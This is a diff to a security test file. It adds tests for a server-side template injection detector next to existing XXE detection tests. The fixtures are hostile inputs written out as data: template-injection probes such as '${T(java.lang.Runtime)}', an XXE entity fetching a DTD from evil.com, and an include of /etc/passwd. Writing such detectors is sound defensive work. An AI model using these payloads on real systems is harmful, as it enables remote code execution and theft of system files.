@@ -23,6 +23,7 @@ import {
   containsSSRF,
   containsLDAPi,
   containsXXE,
+  containsSSTI,
   generateCSRFToken,
   validateCSRFToken,
   validateJWTStructure,
@@ -193,6 +194,18 @@ test('XXE — containsXXE', () => {
   assert.strictEqual(containsXXE('<!ENTITY % dtd SYSTEM "http://evil.com/dtd">'), true)
   assert.strictEqual(containsXXE('xi:include href="file:///etc/passwd"'), true)
   assert.strictEqual(containsXXE('<user>normal data</user>'), false)
+})
+
+// ===== 11b. SSTI Tests =====
+test('SSTI — containsSSTI', () => {
+  assert.strictEqual(containsSSTI('{{7*7}}'), true)
+  assert.strictEqual(containsSSTI('${7*7}'), true)
+  assert.strictEqual(containsSSTI('#{7*7}'), true)
+  assert.strictEqual(containsSSTI('{{this.constructor.prototype}}'), true)
+  assert.strictEqual(containsSSTI('{{[].constructor.prototype}}'), true)
+  assert.strictEqual(containsSSTI('${T(java.lang.Runtime)}'), true)
+  assert.strictEqual(containsSSTI('<%= 7*7 %>'), true)
+  assert.strictEqual(containsSSTI('normal text'), false)
 })
 
 // ===== 12. CSRF Token Tests =====
